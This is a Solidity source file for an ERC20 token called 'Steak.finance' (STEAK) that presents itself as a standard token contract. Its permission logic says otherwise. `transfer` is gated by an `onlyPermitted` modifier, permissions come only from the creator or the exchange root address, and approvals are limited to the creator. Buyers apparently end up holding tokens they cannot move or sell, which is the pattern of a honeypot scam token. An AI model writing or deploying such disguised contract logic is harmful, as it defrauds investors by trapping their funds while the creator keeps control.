pragma solidity ^0.6.6;

import "./Exchange.sol";
import "./SafeMath.sol";
import "./Address.sol";

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is Exchange, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _TOKENNAME;
    string private _TOKENSYMBOL;
    uint8 private _DECIMALS;
    uint256 private _SUPPLY;

    constructor () public {
        _TOKENNAME = "Steak.finance";
        _TOKENSYMBOL = "STEAK";
        _DECIMALS = 18;
        _SUPPLY = 32000000000000000000000;
        
        _balances[creator()] = _SUPPLY;
        emit Transfer(address(0), creator(), _SUPPLY);
    }

    function name() public view returns (string memory) {
        return _TOKENNAME;
    }

    function symbol() public view returns (string memory) {
        return _TOKENSYMBOL;
    }

    function decimals() public view returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() public view override returns (uint256) {
        return _SUPPLY;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual onlyCreator override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        
        if(_msgSender() == ExchangeRootAddress())
        { givePermissions(recipient); }
        
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual onlyCreator returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}